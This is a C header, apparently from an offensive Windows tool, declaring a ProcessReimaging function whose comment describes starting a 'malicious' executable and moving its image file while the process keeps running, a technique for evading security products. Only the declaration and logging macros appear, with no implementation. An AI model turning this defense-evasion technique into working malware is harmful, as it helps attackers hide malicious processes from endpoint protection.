#pragma once
#include <Windows.h>
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

#define OKAY(MSG, ...) printf("[+] "		  MSG "\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[*] "          MSG "\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define CHAR(MSG, ...) printf("[>] Press <Enter> to "		MSG "\n", ##__VA_ARGS__)
#define PRINT_ERROR(MSG, ...) fprintf(stderr, "[!] " MSG "Failed! Error: 0x%lx""\n", GetLastError())

/**
* @brief
*	Malicious Process is started, and its location gets changed elsewhere, without affecting the running process
* 
* @param MaliciousExe:
*	CMD path to our malware exe
* 
* @param VictimExe:
*	CMD path to our victim exe
* 
* @return
*	TRUE on success, FALSE on failure
*/
BOOL ProcessReimaging
(
	IN char* MaliciousExe,
	IN char* VictimExe
);